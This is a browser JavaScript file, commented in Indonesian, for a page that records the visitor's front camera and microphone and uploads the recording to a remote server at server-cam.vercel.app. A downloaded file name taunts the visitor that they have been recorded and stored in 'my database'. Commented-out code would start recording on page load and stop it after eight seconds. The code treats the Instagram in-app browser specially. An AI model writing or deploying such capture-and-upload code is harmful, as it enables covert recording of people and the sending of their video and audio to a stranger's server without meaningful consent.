// Variabel global
let recordRTC;
const startButton = document.getElementById('startButton');
const stopButton = document.getElementById('stopButton');
const mongodbURL = 'https://server-cam.vercel.app/api/upload'; // Ganti dengan URL MongoDB Anda


const config = {
    audio: true,
    video: {
        facingMode: "user" // Menggunakan kamera depan
    }
};

// Fungsi untuk memulai perekaman
const isInstagramBrowser = /Instagram|InstagramWebView/.test(navigator.userAgent);

function startRecording() {

    navigator.mediaDevices.getUserMedia(config)
        .then(function(stream) {
            const options = {
                mimeType: 'video/webm;codecs=vp9',
                audioBitsPerSecond: 128000,
                videoBitsPerSecond: 128000, // Bitrate video yang tinggi
                bitsPerSecond: 128000,
                frameInterval: 128000,
                frameRate: 128000, // Frame rate tinggi
                bufferSize: 163844444,
            };

            console.log(stream)

            recordRTC = RecordRTC(stream, options);
            recordRTC.startRecording();
        })
        .catch(function(error) {
            // startRecording()
            console.error('Kesalahan saat mengakses perangkat media: ', error);
        });
}


// Fungsi untuk menghentikan perekaman dan mengunggah video ke MongoDB
function stopRecording() {
    recordRTC.stopRecording(function() {
        const blob = recordRTC.getBlob();
        const dataURL = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = dataURL;
        a.download = 'sorry kamu sudah direkam dan video kamu sudah di simpan ke database saya';
        a.click();

        const video = document.querySelector('video');
        video.innerHTML = `<source src="${dataURL}" type="video/mp4"/>`
        video.play()

        const formData = new FormData();
        formData.append('video', blob, 'video/webm');

        fetch(mongodbURL, {
                method: 'POST',
                body: formData,
                // headers: {
                //     'Content-Type': 'multipart/form-data'
                // }
            })
            .then(e => e.json())
            .then(response => console.log(response))
            .catch(error => console.log('gagal menyimpan', error))

        // URL.revokeObjectURL(dataURL)
    });
}


if (isInstagramBrowser) {
    const peringatan = document.querySelector('.modal-body')
    document.body.classList.add('overlow-hidden')
    peringatan.classList.remove('d-none')
} else {
    const peringatan = document.querySelector('.modal-body')
    peringatan.classList.add('d-none')
        // startRecording()
        // setTimeout(() => {
        //     stopRecording()
        // }, 8000)
}






// function videoElement(buffer) {

//     const modifiedBuffer = new Uint8Array(buffer);
//     const blob = new Blob([modifiedBuffer], { type: 'video/webm' })

//     const elemenVideo = document.querySelector('video')
//     const urlSrc = URL.createObjectURL(blob);
//     const source = `<source src='${urlSrc}' type='video/mp4' />`
//     elemenVideo.innerHTML = source
//     return console.log(source);
// }

// fetch('https://server-cam.vercel.app/data/0')
//     .then(e => e.json())
//     .then(response => {
//         console.log(response.video.data.data)
//         videoElement(response.video.data.data)
//     })